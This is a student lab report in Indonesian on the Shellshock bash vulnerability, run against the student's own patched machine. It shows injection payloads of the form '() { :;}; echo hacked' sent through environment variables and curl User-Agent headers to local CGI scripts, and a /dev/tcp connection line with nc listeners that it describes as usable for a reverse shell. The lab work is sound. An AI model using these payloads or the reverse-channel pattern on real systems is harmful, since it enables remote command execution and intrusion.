#R3 - OS Attack

Nama: Xyz Frizy Firstyaji
NRP: 5024221073

##Tujuan

Untuk memahami Shellshock Attack serta melihat seberapaa rentan sistem ketika envirenment variable menjalankan perintah secara tidak sah. Percobaan ini juga dapat membuktikan bagaimana bash memproses function yang dikirim melalui environment variable, serta memahami perbedaan prilaku antara sistem yang rentan (unpatched) dengan yang patched.


## Implementasi

Pada percobaan ini dilakukan beberapa langkah untuk memahami cara kerja Shellshock Attack.

Pertama, dilakukan pengujian apakah sistem masih rentan terhadap Shellshock dengan mengirimkan payload melalui environment variable.

Selanjutnya, dilakukan percobaan untuk melihat bagaimana environment variable diturunkan ke child process menggunakan Bash.

Kemudian, dilakukan simulasi pengiriman function melalui environment variable untuk melihat apakah fungsi tersebut dapat dijalankan pada child process.

Terakhir, dilakukan percobaan menggunakan payload Shellshock untuk melihat apakah perintah tambahan dapat dieksekusi. Dari hasil percobaan, sistem tidak menjalankan perintah tambahan, yang menunjukkan bahwa sistem sudah diperbaiki dan tidak lagi rentan terhadap Shellshock.

###W6.1
Ketika sebuah variabel shell yang berisi definisi fungsi dikirim ke child process melalui environment variable, maka definisi fungsi tersebut akan disimpan sebagai environment variable.

Pada versi Bash yang lama (vulnerable), fungsi tersebut akan otomatis di-import dan dapat dijalankan pada child process. Namun pada versi Bash yang sudah diperbaiki (patched), fungsi tersebut tidak akan dieksekusi dan hanya dianggap sebagai environment variable biasa.

### W6.2

Ketika sebuah Bash program mendefinisikan sebuah fungsi, kemudian fungsi tersebut di-export, maka fungsi tersebut akan dikirim sebagai environment variable ke child process.

Pada Bash versi lama, saat child process dijalankan menggunakan Bash, environment variable yang berisi definisi fungsi akan diparsing kembali dan diubah menjadi fungsi yang bisa digunakan di child process.

Namun pada Bash versi yang sudah diperbaiki (patched), mekanisme ini sudah dinonaktifkan. Environment variable yang berisi fungsi tidak lagi diinterpretasikan sebagai fungsi, sehingga fungsi tersebut tidak tersedia di child process.

### W6.3

Salah satu contoh definisi fungsi Bash yang digunakan untuk mengeksploitasi Shellshock adalah sebagai berikut:

ekji@joyy:~$ env x='() { :;}; echo hacked' bash -c "echo test"
test

Penjelasan:
x='() { :;}; echo hacked' adalah environment variable yang berisi definisi fungsi kosong, diikuti dengan perintah tambahan echo hacked.
Pada Bash yang rentan, perintah setelah definisi fungsi (echo hacked) akan langsung dieksekusi saat Bash dijalankan.
Perintah bash -c "echo test" digunakan untuk menjalankan shell baru.

Jika sistem masih rentan, maka output yang dihasilkan adalah:
hacked
test

Namun pada sistem yang sudah diperbaiki (patched), hanya akan muncul:
test

Hal ini menunjukkan bahwa perintah tambahan tidak dieksekusi, sehingga sistem tidak rentan terhadap Shellshock.

Inti dari Shellshock:
function + command tambahan = command injection

###W6.4
Bash:
export foo=’echo world; () { echo hello;}’


Perintah echo world tidak akan dieksekusi
Hal ini karena Bash hanya akan mengenali environment variable sebagai fungsi jika formatnya dimulai dengan definisi fungsi

Pada kasus ini, string diawali dengan echo world;, sehingga tidak dikenali sebagai definisi fungsi. Akibatnya, Bash tidak akan memprosesnya sebagai fungsi maupun mengeksekusi perintah tersebut.

Baik pada Bash versi lama maupun yang sudah diperbaiki (patched), perintah echo world tidak akan dijalankan dalam kasus ini.

### W6.5

Agar kerentanan Shellshock dapat dieksploitasi, terdapat dua kondisi yang harus terpenuhi:

1. Sistem menggunakan Bash yang masih rentan (belum diperbaiki), sehingga Bash masih memproses environment variable yang berisi definisi fungsi secara tidak aman.

2. Terdapat mekanisme yang memungkinkan input dari user dimasukkan ke dalam environment variable, sehingga attacker dapat menyisipkan payload berbahaya.

Jika kedua kondisi tersebut terpenuhi, maka attacker dapat mengirimkan environment variable yang berisi definisi fungsi diikuti dengan perintah tambahan, yang kemudian akan dieksekusi secara otomatis oleh Bash.

Bash:
ekji@joyy:~$ env x='() { :;}; echo hacked' bash -c "echo test"
test

kondisi 1 gagal (bash sudah patched)
dua syarat HARUS terpenuhi bersama

### W6.6

Pada CGI program, input dari user dapat masuk ke dalam program melalui HTTP request, seperti melalui header (misalnya User-Agent, Cookie) atau parameter URL.

Web server akan mengubah input tersebut menjadi environment variable sebelum menjalankan CGI program. Sebagai contoh, header "User-Agent" akan diubah menjadi environment variable bernama "HTTP_USER_AGENT".

Jika CGI program dijalankan menggunakan Bash, maka environment variable tersebut akan diproses oleh Bash. Pada Bash yang rentan, hal ini dapat dimanfaatkan oleh attacker dengan menyisipkan payload berbahaya dalam header HTTP, sehingga perintah tersebut dapat dieksekusi.

Browser -> HTTP Request -> Web Server -> Environment Variable -> Bash -> EKSEKUSI

Ketika user mengirim:
User-Agent: () { :;}; echo hacked

Maka server berubah menjadi:
HTTP_USER_AGENT="() { :;}; echo hacked"

Ketika vulnerable, bash akan mengexecute:
echo hacked

Kesimpulan:
user input -> masuk env -> bash parse -> bisa dieksploitasi

Hal ini dapat menyebabkan Shellshock menjadi remote attack, bukan hanya local

### W6.7

Tidak, kita tidak dapat langsung menaruh perintah shell biasa di dalam field seperti User-Agent untuk dieksekusi.

Hal ini karena Bash hanya akan memproses environment variable sebagai fungsi jika formatnya sesuai dengan definisi fungsi, yaitu dimulai dengan `() { ... }`.

Pada Shellshock, perintah tambahan hanya akan dieksekusi jika ditempatkan setelah definisi fungsi dalam environment variable.

Jika hanya berisi perintah biasa tanpa format fungsi, maka Bash tidak akan mengeksekusi perintah tersebut, melainkan hanya memperlakukannya sebagai string biasa.

Shellshock membutuhkan format:
User-Agent: () { :;}; echo hacked
Untuk menjalankan bash, karena harus ada definition function baru bash pairing. Intinya tenpa ada function definition, bash tidak dapat exploit.

Hal ini menunjukkan bahwa Shellshock bukan hanya command injection biasa, tapi bug yang diparsing function bash.

### W6.8

Kesalahan ini terjadi karena Bash mencoba memberikan fitur tambahan, yaitu memungkinkan definisi fungsi dikirim melalui environment variable dan digunakan kembali pada child process.

Namun, implementasi parsing pada Bash tidak dilakukan dengan aman. Bash tetap mengeksekusi perintah yang berada setelah definisi fungsi, sehingga membuka celah untuk command injection.

Pelajaran yang dapat diambil adalah bahwa fitur yang dirancang untuk kemudahan penggunaan dapat menjadi celah keamanan jika tidak diimplementasikan dengan hati-hati. Selain itu, input yang berasal dari luar (user input) harus selalu dianggap tidak aman dan perlu divalidasi dengan baik.

Bash bekerja dengan function dapat diwariskan menggunakan env, namun ketika parsing nya salah maka command ikut keexecute.
Kesimpulan: Fitur adalah kemudahan, dan bug adalah konsekuensi, namun keamanan adalah hal yang lebih penting daripada kemudahan.

### W6.9

Secara teori kita dapat menaruh payload berbahaya dalam field value pada URL:
http://www.example.com/myprog.cgi?name=payload

Nilai parameter tersebut akan diteruskan oleh web server ke CGI program, biasanya melalui environment variable atau parameter input.

Jika CGI program tersebut menggunakan Bash yang rentan terhadap Shellshock, maka payload berupa definisi fungsi yang diikuti perintah tambahan dapat dieksekusi.

Namun, agar eksploitasi berhasil, tetap harus memenuhi dua kondisi utama:
1. Bash yang digunakan masih rentan (belum diperbaiki).
2. Input dari URL benar-benar dimasukkan ke dalam environment variable yang diproses oleh Bash.

Jika kedua kondisi tersebut tidak terpenuhi, maka payload tidak akan dieksekusi.

URL -> web server -> CGI -> environment variable -> Bash

Contoh:
name=() { :;}; echo hacked

Ketika vulnerable, hacked akan dieksekusi. Hal ini dapat terjadi melalui URL ketika dapat mengakses env dan bash vulnerable.

### W6.10

Pada Machine 1 dijalankan perintah:
nc -l 7070
Perintah ini membuat Machine 1 mencoba koneksi pada port 7070.

Kemudian pada Machine 2 dijalankan:
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0

Perintah ini akan membuka koneksi TCP ke Machine 1 pada port 7070 menggunakan fitur /dev/tcp.

Penjelasan:
/bin/cat < /dev/tcp/10.0.2.6/7070 akan membaca data dari koneksi TCP tersebut.
>&0 akan mengarahkan output dari cat ke standard input (stdin).
    
Akibatnya, terbentuk komunikasi antara kedua mesin, di mana input dan output dapat saling terhubung melalui koneksi TCP tersebut.

Dengan kata lain, Machine 2 akan terhubung ke Machine 1, dan data yang dikirim melalui koneksi tersebut dapat dibaca oleh kedua sisi.

Machine 1 → buka port (nc -l)
Machine 2 → connect (/dev/tcp)
Maka channel saling berkomunikasi

Hal ini dapat digunakan untuk reverse shell atau remote interaction.

### W6.11

Untuk menjalankan program `/bin/cat` di Machine 1, menerima input dari Machine 2, dan menampilkan output ke Machine 3, dapat dilakukan dengan memanfaatkan koneksi TCP.

Langkah-langkahnya adalah sebagai berikut:

1. Machine 3 menjalankan listener untuk menerima output:
nc -l 7071

2.    Machine 1 menjalankan program /bin/cat dan mengarahkan output ke Machine 3:
/bin/cat | nc <IP_Machine3> 7071

3.    Machine 1 juga membuka koneksi untuk menerima input dari Machine 2:
nc -l 7070 | /bin/cat | nc <IP_Machine3> 7071

4.    Machine 2 mengirim input ke Machine 1:
echo "Hello" | nc <IP_Machine1> 7070

Penjelasan:
Machine 2 mengirim data ke Machine 1 melalui port 7070.
Machine 1 menjalankan /bin/cat untuk membaca input tersebut.
Output dari /bin/cat kemudian dikirim ke Machine 3 melalui port 7071.
Machine 3 menerima dan menampilkan output tersebut.

Dengan ini, terbentuk alur komunikasi:
Machine 2 -> Machine 1 -> Machine 3
(input) -> (bin/cat) -> (output)

Terminal 1: (output dari terminal 3)
ekji@joyy:~$ nc -l 7071
halo dari machine 2

Terminal 2: (pipeline nc | cat)
ekji@joyy:~$ nc -l 7070 | /bin/cat | nc localhost 7071

Terminal 3: (echo input)
ekji@joyy:~$ echo "halo dari machine 2" | nc localhost 7070

Percobaan dilakukan menggunakan tiga terminal untuk mensimulasikan tiga mesin.

Hasil menunjukkan bahwa input dari Terminal 3 berhasil diproses oleh Terminal 2 menggunakan /bin/cat, dan output dikirim ke Terminal 1.

Hal ini membuktikan bahwa komunikasi antar mesin melalui pipeline dan TCP berhasil dilakukan.

### W6.12

Pada percobaan ini dibuat sebuah program C yang melakukan fork dan menjalankan `/bin/sh` menggunakan `execve`.

Program yang digunakan:

### #include <stdio.h>
### #include <stdlib.h>
### #include <unistd.h>

extern char **environ;

int main()
{
    char *args[] =
    {
        "/bin/sh", "-c",
        "/bin/ls", NULL
    };

    pid_t pid = fork();

    if(pid == 0) {
        /* child */
        printf("child\n");
        execve(args[0], &args[0], NULL);
    }
    else if(pid > 0) {
        /* parent */
        printf("parent\n");
    }

    return 0;
}

Program Compile:
ekji@joyy:~$ nano prog.c
ekji@joyy:~$ gcc prog.c -o prog
ekji@joyy:~$ export foo='() { echo hello; }; echo world;'
ekji@joyy:~$ ./prog
parent
child
ekji@joyy:~$ Desktop    Music     Templates    ls           prog      snap
Documents  Pictures  Videos    path_attack    prog.c      src-arm
Downloads  Public    bof-lab    path_attack.c  seed-labs  src-arm.zip

Tidak muncul output "hello" maupun "world", dan program menjalankna oerintah /bin/ls dan menampilkan daftar file.

Hal ini terjadi karena pada fungsi execve, parameter environment diatur menjadi NULL, sehingga environment variable (termasuk payload Shellshock) tidak diteruskan ke child process.

Akibatnya, Bash tidak menerima environment variable yang berisi payload, sehingga tidak ada perintah tambahan yang dieksekusi.

Dengan demikian, meskipun terdapat payload Shellshock pada environment variable, eksploitasi tidak berhasil karena environment tidak diteruskan ke proses child.

### W6.13

Pada percobaan ini dilakukan perubahan pada program sebelumnya, yaitu parameter environment pada fungsi `execve` diubah dari `NULL` menjadi `environ`.

Perubahan kode:
execve(args[0], &args[0], environ);

ekji@joyy:~$ nano prog.c
ekji@joyy:~$ gcc prog.c -o prog
ekji@joyy:~$ export foo='() { echo hello; }; echo world;'
ekji@joyy:~$ ./prog
parent
child
ekji@joyy:~$ bof-lab    Downloads  path_attack    prog    seed-labs    src-arm.zip
Desktop    ls          path_attack.c  prog.c  snap    Templates
Documents  Music      Pictures         Public  src-arm    Videos

Output: sama seperti task sebelumnya, yang berbeda adalah pada percobaan ini environment variable berhasil diteruskan ke child process karena menggunakan environ.

Namun, perintah tambahan pada payload tidak dieksekusi karena Bash yang digunakan sudah diperbaiki (patched), sehingga tidak lagi rentan terhadap Shellshock.

Percobaan ini menunjukkan bahwa meskipun environment variable diteruskan, eksploitasi tetap tidak berhasil jika sistem sudah aman.

### W6.14

Pada percobaan ini dibandingkan dua program:

1. Program PHP:
<?php
system("/bin/ls -l")
?>

Program CGI:
/bin/ls -l

Keduanya menjalankan perintah /bin/ls -l menggunakan shell (/bin/sh yang mengarah ke Bash).

Ketika dilakukan request dengan payload:
curl -A "() { echo hello; }; echo world;" http://localhost/test.php
curl -A "() { echo hello; }; echo world;" http://localhost/test.cgi

Perbedaan yang terjadi adalah:
    •    Pada program CGI, environment variable seperti User-Agent akan langsung diteruskan ke Bash. Jika Bash masih rentan, maka payload Shellshock dapat dieksekusi.
    •    Pada program PHP, meskipun menggunakan system(), environment variable dari HTTP request tidak secara langsung diproses oleh Bash dalam konteks yang sama, sehingga eksploitasi Shellshock tidak selalu berhasil.

Dengan kata lain, CGI lebih rentan terhadap Shellshock karena lebih langsung menggunakan Bash dan mewariskan environment variable dari request.

Agar Shellshock dapat dieksploitasi, diperlukan dua kondisi:
    1.    Bash yang digunakan masih rentan (belum patched).
    2.    Input dari user (misalnya HTTP header seperti User-Agent) masuk ke environment variable yang diproses oleh Bash.

Jika kedua kondisi tersebut tidak terpenuhi, maka payload tidak akan dieksekusi.
##CGI
HTTP request -> env -> Bash langsung
raw -> langsung bash

##PHP
HTTP -> PHP -> system() -> shell. Tidak langsung expose env ke bash parsing

ekji@joyy:~$ mkdir ~/shellshock-test
cd ~/shellshock-test
nano test.cgi

Isi file test.cgi:
### #!/bin/bash

echo "Content-type: text/plain"
echo ""

echo "User-Agent: $HTTP_USER_AGENT"

##Terminal 1 (server):
ekji@joyy:~/shellshock-test$ python3 -m http.server --cgi 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
127.0.0.1 - - [12/Apr/2026 14:33:04] "GET /cgi-bin/test.cgi HTTP/1.1" 200 -

##Terminal 2 (input & outout):
ekji@joyy:~/shellshock-test$ curl -A "Xyz Frizy Firstyaji 5024221073" http://localhost:8000/cgi-bin/test.cgi
User-Agent: Xyz Frizy Firstyaji 5024221073
ekji@joyy:~/shellshock-test$ curl -A "() { :;}; echo hacked" http://localhost:8000/cgi-bin/test.cgi
User-Agent: () { :;}; echo hacked

Percobaan dilakukan menggunakan CGI sederhana dengan Python HTTP server.

Hasil menunjukkan bahwa header HTTP (User-Agent) berhasil diteruskan menjadi environment variable dan dapat diakses oleh Bash.

Namun, ketika diberikan payload Shellshock, perintah tambahan tidak dieksekusi. Hal ini menunjukkan bahwa sistem yang digunakan sudah diperbaiki (patched) dan tidak rentan terhadap Shellshock.
